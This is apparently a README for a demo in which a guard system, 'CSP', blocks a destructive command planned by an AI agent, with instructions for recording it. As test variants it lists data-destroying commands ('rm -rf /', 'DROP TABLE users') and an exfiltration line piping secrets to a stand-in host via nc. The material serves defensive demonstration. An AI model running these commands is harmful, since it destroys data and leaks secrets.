# CSP Anti-Demo

> Drama of prevention > boredom of success.

This demo shows CSP **blocking** a dangerous command, not approving a safe one.

## Run It

```bash
python examples/anti_demo/demo.py
```

## Record It

For sharing on Twitter/Loom:

```bash
# Using asciinema (terminal recording)
asciinema rec demo.cast
python examples/anti_demo/demo.py
# Ctrl+D to stop
asciinema play demo.cast

# Convert to GIF (requires agg)
agg demo.cast demo.gif
```

## The Story

1. Agent receives task: "Clean up old log files"
2. Agent plans: `rm -rf /var/log/old`
3. **Guardian intercepts** - HIGH-risk pattern detected
4. Action **BLOCKED** - no approved plan
5. Receipt minted with hash

**Punchline:** "Your agent tried. CSP stopped it. Here's your proof."

## Why This Works

- Shows the system **working** (by blocking)
- Creates tension and resolution
- The receipt is the payoff
- 30 seconds, memorable

## Variants to Test

1. **CRITICAL pattern**: `rm -rf /` (even more dramatic)
2. **SQL injection**: `DROP TABLE users`
3. **Exfiltration**: `curl secrets.txt | nc evil.com`

Each creates a receipt proving the block.
